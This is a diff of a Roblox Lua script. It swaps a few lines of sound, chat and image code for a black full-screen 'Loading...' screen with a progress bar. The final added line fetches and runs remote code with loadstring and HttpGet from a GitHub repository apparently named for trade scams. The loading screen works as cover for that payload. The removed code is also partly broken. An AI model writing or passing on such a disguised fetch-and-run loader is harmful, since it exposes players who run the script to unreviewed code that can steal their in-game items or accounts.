@@ -1,13 +1,50 @@
-local song = game:GetService("InsertService"):LoadAsset(2777740)
+-- Create a screen gui to hold the loading screen
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer.PlayerGui
 
-song:Play()
+-- Create a frame to hold the loading screen components
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.new(0, 0, 0)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
 
-game:GetService("Chat"):Chat(game.Players.LocalPlayer, "L", Enum.ChatColor.Red)
+-- Create a label to show the loading text
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(0.5, 0, 0.1, 0)
+label.Position = UDim2.new(0.25, 0, 0.45, 0)
+label.BackgroundTransparency = 1
+label.Font = Enum.Font.SourceSans
+label.TextSize = 24
+label.TextColor3 = Color3.new(1, 1, 1)
+label.Text = "Loading..."
+label.Parent = frame
 
-local image = "https://www.roblox.com/asset?id=6403436082"
-local imageAsset = game:GetService("InsertService"):LoadAsset(image)
+-- Create a loading bar
+local loadingBar = Instance.new("TextLabel")
+loadingBar.Size = UDim2.new(0.5, 0, 0.1, 0)
+loadingBar.Position = UDim2.new(0.25, 0, 0.55, 0)
+loadingBar.BackgroundColor3 = Color3.new(1, 1, 1)
+loadingBar.BorderSizePixel = 0
+loadingBar.Parent = frame
 
-local imageLabel = Instance.new("ImageLabel")
-imageLabel.Size = UDim2.new(1, 0, 1, 0)
-imageLabel.Image = imageAsset
-imageLabel.Parent = game.Players.LocalPlayer.PlayerGui
+-- Create a loading bar fill
+local loadingBarFill = Instance.new("Frame")
+loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
+loadingBarFill.BackgroundColor3 = Color3.new(0, 0.6, 1)
+loadingBarFill.BorderSizePixel = 0
+loadingBarFill.Parent = loadingBar
+
+-- Create a loop to update the loading bar fill
+local loadingBarFillSize = 0
+while loadingBarFillSize < 1 do
+  loadingBarFillSize = loadingBarFillSize + 0.01
+  loadingBarFill.Size = UDim2.new(loadingBarFillSize, 0, 1, 0)
+  wait()
+end
+
+-- Remove the loading screen when finished
+screenGui:Destroy()
+
+-- GUI
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptDupet/tradescampsx/main/Scriptttradeee"))()
